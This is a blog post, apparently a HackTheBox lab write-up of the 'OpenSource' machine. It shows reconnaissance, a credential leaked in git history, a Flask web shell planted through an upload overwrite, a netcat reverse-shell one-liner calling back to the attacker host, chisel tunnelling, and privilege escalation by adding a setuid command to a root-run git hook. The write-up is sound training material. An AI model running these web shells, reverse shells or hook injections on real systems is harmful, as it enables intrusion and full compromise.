<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="UnJN0X8aSA7Vas0N6FhAFn-PjFV-OU0wZh9gGAnWM0o"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB OpenSource" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Fingerprinting" /><meta property="og:description" content="Fingerprinting" /><link rel="canonical" href="congkhainguyen.github.io/pentesting/htb/machines/opensource" /><meta property="og:url" content="congkhainguyen.github.io/pentesting/htb/machines/opensource" /><meta property="og:site_name" content="Kaiba_404’s Blog" /><meta property="og:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/OpenSource.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-29T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/OpenSource.png" /><meta property="twitter:title" content="HTB OpenSource" /><meta name="twitter:site" content="@giangkhail12999" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-08-29T00:00:00+02:00","datePublished":"2022-08-29T00:00:00+02:00","description":"Fingerprinting","headline":"HTB OpenSource","image":{"width":800,"height":500,"url":"congkhainguyen.github.io/assets/img/hackthebox/card/OpenSource.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"congkhainguyen.github.io/pentesting/htb/machines/opensource"},"url":"congkhainguyen.github.io/pentesting/htb/machines/opensource"}</script><title>HTB | OpenSource | Kaiba_404's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Kaiba_404's Blog"><meta name="application-name" content="Kaiba_404's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Kaiba_404's Blog</a></div><div class="site-subtitle font-italic">CyberSec Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fa fa-list ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fa fa-globe ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fa fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fa fa-user ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/CongKhaiNGUYEN" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/giangkhail12999" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB | OpenSource</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB | OpenSource</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661724000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 29, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="/assets/img/hackthebox/card/OpenSource.png" class="preview-img bg" alt="Preview Image" width="800" height="500" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> Cong Khai NGUYEN </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1147 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="fingerprinting">Fingerprinting</h1><p>The nmap show:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre>PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 29 Aug 2022 21:26:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="UTF-8"&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;
|     &lt;script src="/static/vendor/jquery/jquery-3.4.1.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/vendor/popper/popper.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/vendor/bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt;
|     &lt;script src="/static/js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;
|     &lt;link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/&gt;
|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/&gt;
|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/&gt;
|     &lt;link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 29 Aug 2022 21:26:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd"&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data.

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>If we go to the webpage we can download a zip with the content of a program. We can see a <strong>.git</strong> folder. Let’s see the branches:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>git branch                                       
<span class="go">	  dev
	* public
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>git log dev                                      
<span class="go">	commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
</span><span class="gp">	Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">	Date:   Thu Apr 28 13:47:24 2022 +0200
	
	    ease testing
	
	commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
</span><span class="gp">	Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">	Date:   Thu Apr 28 13:46:54 2022 +0200
	
	    added gitignore
	
	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
</span><span class="gp">	Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">	Date:   Thu Apr 28 13:46:16 2022 +0200
	
	    updated
	
	commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
</span><span class="gp">	Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">	Date:   Thu Apr 28 13:45:17 2022 +0200
	
	    initial
</span></pre></table></code></div></div><p>We can start searching in each one with <code class="language-plaintext highlighter-rouge">git show &lt;commit&gt;</code> :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
<span class="go">
	git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
</span><span class="gp">	Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">	Date:   Thu Apr 28 13:46:16 2022 +0200
	
	    updated
	
	diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
	new file mode 100644
	index 0000000..5975e3f
	--- /dev/null
	+++ b/app/.vscode/settings.json
	@@ -0,0 +1,5 @@
	+{
	+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
</span><span class="gp">	+  "http.proxy": "http://dev01:Soulless_Developer#</span>2022@10.10.10.128:5187/<span class="s2">",
</span><span class="go">	+  "http.proxyStrictSSL": false
	+}
	diff --git a/app/app/views.py b/app/app/views.py
</span></pre></table></code></div></div><p>We can see a pair of credentials: <strong>dev01:Soulless_Developer#2022</strong>. But they are not use for SSH. This commit change the <strong>views.py</strong> file, if we checked it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>

<span class="kn">from</span> <span class="n">app.utils</span> <span class="kn">import</span> <span class="n">get_file_name</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>

<span class="kn">from</span> <span class="n">app</span> <span class="kn">import</span> <span class="n">app</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="s">'success.html'</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s">"uploads/"</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="s">'upload.html'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/uploads/&lt;path:path&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">send_report</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span>
</pre></table></code></div></div><p>We see that is using <strong>flask</strong> and <strong>templates</strong>. As well as some path, like <strong>uploads</strong>.</p><h1 id="foothold">Foothold</h1><p>We can try to manipulate the upload function and overwriting the <strong>views.py</strong> file. Go <code class="language-plaintext highlighter-rouge">http://10.10.11.164/upcloud</code> and upload a file, but intercept the request with burp. We can see that the web is uploading the file as:</p><p><img data-src="/assets/img/hackthebox/labs/opensource/Untitled.png" alt="Untitled" data-proofer-ignore></p><p>We can change this into our reverse shell, using the following content:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="s">'/shell'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">cmd</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s">'cmd'</span><span class="p">))</span>
</pre></table></code></div></div><p>This should be the final output:</p><p><img data-src="/assets/img/hackthebox/labs/opensource/Untitled%201.png" alt="Untitled" data-proofer-ignore></p><p>Send it with the forward button from burp.</p><p>We can start now a reverse shell:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>netcat <span class="nt">-lvnp</span> 443
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>curl <span class="s1">'http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202&gt;%261|nc%2010.10.16.44%20443%20&gt;/tmp/f'</span>
</pre></table></code></div></div><p>And now, we should have our reverse shell stablished. We can see that we are directly root:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">/app #</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">	root
</span></pre></table></code></div></div><p>A bit strange, no? Testing the network, we can see that we are not in the main machine.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">/app #</span><span class="w"> </span>ifconfig
<span class="go">	eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:06  
	          inet addr:172.17.0.6  Bcast:172.17.255.255  Mask:255.255.0.0
	          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	          RX packets:861 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:747 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:0 
	          RX bytes:83162 (81.2 KiB)  TX bytes:1068984 (1.0 MiB)
	
	lo        Link encap:Local Loopback  
	          inet addr:127.0.0.1  Mask:255.0.0.0
	          UP LOOPBACK RUNNING  MTU:65536  Metric:1
	          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1000 
	          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</span></pre></table></code></div></div><p>We must found a way to scape from this container to our machine. We can notice that from here we have access to the filtered port 3000.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">/app #</span><span class="w"> </span>nc <span class="nt">-nv</span> 10.10.11.164 3000
<span class="go">	10.10.11.164 (10.10.11.164:3000) open
</span></pre></table></code></div></div><p>We can try forward the port to our machine with chisel. Download the binary into the container. First use the upload function we have in the web to upload the binary. We can see that the path it is saved is <code class="language-plaintext highlighter-rouge">http://10.10.11.164/uploads/chisel</code> . If we try downloading from the container we will get an error:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">/root #</span><span class="w"> </span>wget http://10.10.11.164/uploads/chisel
<span class="go">	Connecting to 10.10.11.164 (10.10.11.164:80)
	wget: server returned error: HTTP/1.1 500 INTERNAL SERVER ERROR
</span></pre></table></code></div></div><p>But if we download it from the localhost:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">/root #</span><span class="w"> </span>wget http://127.0.0.1/uploads/chisel
<span class="go">	Connecting to 127.0.0.1 (127.0.0.1:80)
	saving to 'chisel'
	chisel               100% |********************************| 8544k  0:00:00 ETA
	'chisel' saved
</span></pre></table></code></div></div><p>This is because the container doesn’t have a direct connection to the target or our machine.</p><p>We can use chisel on our machine:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span>chisel server <span class="nt">--port</span> 3000 <span class="nt">-v</span> <span class="nt">--reverse</span> <span class="nt">--socks5</span>
</pre></table></code></div></div><p>And on the container:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">/app #</span><span class="w"> </span>./chisel client 10.10.16.44:3000 R:5000:socks
</pre></table></code></div></div><p>Now we can access it on localhost:5000. We can see that is a git repository, with the previous founded credentials we can get an RSA.</p><h1 id="privilege-escalation">Privilege Escalation</h1><p>Executing <a href="https://github.com/DominicBreuker/pspy">pspy</a> we can see that it is commiting backups automatically:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>2022/08/29 22:54:01 CMD: UID=0    PID=23023  | git commit -m Backup for 2022-08-29 
2022/08/29 22:54:01 CMD: UID=0    PID=23025  | /bin/sh .git/hooks/pre-commit 
2022/08/29 22:54:01 CMD: UID=0    PID=23026  | git push origin main 
2022/08/29 22:54:01 CMD: UID=0    PID=23032  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
</pre></table></code></div></div><p>In <a href="https://gtfobins.github.io/gtfobins/git/">GTFObins</a> we can get some info about the <code class="language-plaintext highlighter-rouge">pre-commit</code>. Taking the example for there, let’s try modifying the bash permissions and executing it by ourselves:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">-bash-4.4$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">&gt;&gt;</span> ~/.git/hooks/pre-commit
<span class="gp">-bash-4.4$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="o">!</span><span class="err">$</span>
<span class="go">chmod +x ~/.git/hooks/pre-commit
</span><span class="gp">bash-4.4#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">	root
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting/'>Pentesting</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/machines/" class="post-tag no-text-decoration" >machines</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB+%7C+OpenSource+-+Kaiba_404%27s+Blog&url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fopensource" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB+%7C+OpenSource+-+Kaiba_404%27s+Blog&u=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fopensource" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fopensource&text=HTB+%7C+OpenSource+-+Kaiba_404%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/ctf-like/reversing/crackme-packed">Reversing | CrackMe Packed</a><li><a href="/index">Index</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/pentesting/htb/machines/arctic">HTB | Arctic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" 